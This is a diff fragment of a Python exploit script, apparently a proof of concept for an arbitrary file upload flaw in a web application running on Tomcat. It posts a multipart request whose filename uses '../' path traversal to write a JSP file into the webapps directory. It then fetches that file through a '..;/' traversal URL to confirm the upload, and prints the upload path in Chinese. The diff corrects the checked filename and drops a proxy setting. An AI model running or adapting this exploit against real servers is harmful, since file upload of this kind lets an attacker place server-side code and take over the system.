@@ -50,10 +50,10 @@ def exp(host):
     }
     data ='------WebKitFormBoundary9PggsiM755PLa54a\r\nContent-Disposition: form-data; name="file"; filename="../../tomcat85linux64.1/webapps/els/static/MDTEST.jsp"\r\nContent-Type:application/zip\r\n\r\n<%out.print("MDSEC");%>\r\n\r\n------WebKitFormBoundary9PggsiM755PLa54a--'
     vulurl = url + "/svm/api/external/report"
-    vulurl2= url+"/portal/ui/login/..;/..;/METEST.jsp"
+    vulurl2= url+"/portal/ui/login/..;/..;/MDTEST.jsp"
     try:
         
-        r = requests.post(vulurl, headers=headers,data=data,proxies=proxysdata)
+        r = requests.post(vulurl, headers=headers,data=data)
         if r.status_code==200 and "data" in r.text :
             print(url+r.text+"上传路径为/portal/ui/login/..;/..;/XXX")
             r2=requests.get(vulurl2,headers=headers2)
